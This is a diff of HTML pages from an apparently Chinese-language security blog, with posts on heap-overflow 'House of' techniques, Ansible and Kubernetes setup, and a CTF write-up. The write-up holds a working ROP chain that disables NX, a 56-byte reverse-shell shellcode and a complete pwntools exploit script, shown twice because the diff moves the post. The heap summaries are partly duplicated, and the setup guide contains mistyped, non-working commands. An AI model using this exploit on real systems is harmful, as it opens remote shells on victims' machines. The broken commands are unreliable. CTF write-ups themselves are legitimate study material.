-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
       
   
-    <h1 class="title"><a href="/2018/10/21/堆溢出/">堆溢出</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>House of Prime<br>House of Mind<br>House of Force<br>House of Lore<br>House of Spirit<br>House of Mind</p>
-<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p>
-<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
-<h1 id="House-of-Force-1"><a href="#House-of-Force-1" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
-<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>在这个技巧中，攻击者欺骗 glibc malloc 来返回一个块，它位于栈中（而不是堆中）。这允许攻击者覆盖储存在栈中的返回地址。</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/10/21/分布式/">分布式搭建</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="ansible安装"><a href="#ansible安装" class="headerlink" title="ansible安装"></a>ansible安装</h1><h2 id="安装ansible"><a href="#安装ansible" class="headerlink" title="安装ansible"></a>安装ansible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv --no-site-packages venv</span><br><span class="line">source venv/bin/active</span><br><span class="line">pip install ansbile</span><br></pre></td></tr></table></figure>
-<p>ansbile主机配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[test]</span><br><span class="line">127.0.0.1 ansible_ssh_user=aaa ansible_ssh_port=22 ansible_ssh_pass=aaa</span><br></pre></td></tr></table></figure>
-<p>注释这么配置不好，但初始这样配置，为了之后批量分发，分发后请删除这个账户</p>
-<p>ansbile批量推送公钥</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"> ansible-playbook   -i hosts   ssh.yml</span><br></pre></td></tr></table></figure>
-<p>推送文件ssh.yml</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Using alternate directory locations:</span><br><span class="line"> - hosts: test</span><br><span class="line">   user: aaa</span><br><span class="line">   tasks:</span><br><span class="line">    - name: ssh-copy</span><br><span class="line">      authorized_key: user=aaa key=&quot;&#123;&#123; lookup(&apos;file&apos;, &apos;/home/aaa/.ssh/id_rsa.pub&apos;) &#125;&#125;&quot;</span><br><span class="line">      tags:</span><br><span class="line">        - sshkey</span><br></pre></td></tr></table></figure>
-<p>执行代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible  test -i ./hosts  -m command -a &quot;echo &apos;aa&apos;&quot;</span><br></pre></td></tr></table></figure>
-<h1 id="k8s安装（需要翻墙）"><a href="#k8s安装（需要翻墙）" class="headerlink" title="k8s安装（需要翻墙）"></a>k8s安装（需要翻墙）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb https://apt.kubernetes.io/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl kubernetes-cni docker.io </span><br><span class="line">apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure>
-<p>配置文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: kubeadm.k8s.io/v1alpha2</span><br><span class="line">kind: MasterConfiguration</span><br><span class="line">api:</span><br><span class="line">  advertiseAddress: 0.0.0.0</span><br><span class="line">networking:</span><br><span class="line">  podSubnet: 10.244.0.0/16</span><br><span class="line">etcd:</span><br><span class="line">  image: registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.1.11</span><br><span class="line">kubernetesVersion: v1.12.1</span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line"></span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -a</span><br><span class="line">　1. 为docker服务创建一个内嵌的systemd目录</span><br><span class="line"></span><br><span class="line">$ mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line">　　2. 创建/etc/systemd/system/docker.service.d/http-proxy.conf文件，并添加HTTP_PROXY环境变量。其中[proxy-addr]和[proxy-port]分别改成实际情况的代理地址和端口：</span><br><span class="line">　　</span><br><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://[proxy-addr]:[proxy-port]/&quot; &quot;HTTPS_PROXY=http://[proxy-addr]:[proxy-port]/&quot;</span><br><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl restart docker</span><br><span class="line">sudo kubeadm init --config ./kubeadm.conf</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/k8s-manifests/kube-flannel-legacy.yml</span><br><span class="line">需要安装flannel</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/10/21/内核编译/">内核编译</a></h1>
+    <h1 class="title"><a href="/2018/12/11/内核编译/">内核编译</a></h1>
   
 
     </header>
@@ -725,7 +215,7 @@ fuzzing
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -745,81 +235,10 @@ fuzzing
     <header>
       
         <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
-在本題中明顯提供解題者一個stack buffer overflow的漏洞，
-但因為程式有NX保護，必須使用ROP來控制程式行為。
-在寫入的第12byte後開始覆蓋main的return address，
-共計有88 bytes的overflow空間。
-在程式read完以後便切斷該程式對client的連線，
-即使拿到shell也無法操控該shell。
-</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
-但如果全部只使用ROP最多只能放入22個gadgets
-（包括argument與padding等等）。
-所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
-接著便可以shellcode來產生一個reverse shell。
-</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
-將__libc_stack_end的address放入eax中。
-调用_dl_make_stack_executable。
-解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。
-
-放入reverse shell的shellcode
-建立reverse shell須執行socket、dup2、connect、execve等指令，
-由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
-剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：
-
-想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
-由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
-若能應用當時程式的某些state便可減少一點size。
-由於fd中0、1、2皆已被close，
-拿到的socket fd即已為0，因此只需進行一次dup2。
-由於ebp可控（ebp的值會等於input中的第8~11 byte），
-由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
-push port時使用ax中已有的數值（0x66），
-port（big endian）將被固定為0x6600（26112）。
-</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
-<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
         
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
       
   
-    <h1 class="title"><a href="/2018/10/21/两道内核/">驱动漏洞</a></h1>
+    <h1 class="title"><a href="/2018/12/11/两道内核/">驱动漏洞</a></h1>
   
 
     </header>
@@ -1076,7 +495,7 @@ port（big endian）將被固定為0x6600（26112）。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1096,11 +515,209 @@ port（big endian）將被固定為0x6600（26112）。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/windows机制/">windows机制</a></h1>
+    <h1 class="title"><a href="/2018/12/11/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
+在本題中明顯提供解題者一個stack buffer overflow的漏洞，
+但因為程式有NX保護，必須使用ROP來控制程式行為。
+在寫入的第12byte後開始覆蓋main的return address，
+共計有88 bytes的overflow空間。
+在程式read完以後便切斷該程式對client的連線，
+即使拿到shell也無法操控該shell。
+</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
+但如果全部只使用ROP最多只能放入22個gadgets
+（包括argument與padding等等）。
+所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
+接著便可以shellcode來產生一個reverse shell。
+</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
+將__libc_stack_end的address放入eax中。
+调用_dl_make_stack_executable。
+解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。
+
+放入reverse shell的shellcode
+建立reverse shell須執行socket、dup2、connect、execve等指令，
+由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
+剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：
+
+想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
+由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
+若能應用當時程式的某些state便可減少一點size。
+由於fd中0、1、2皆已被close，
+拿到的socket fd即已為0，因此只需進行一次dup2。
+由於ebp可控（ebp的值會等於input中的第8~11 byte），
+由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
+push port時使用ax中已有的數值（0x66），
+port（big endian）將被固定為0x6600（26112）。
+</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
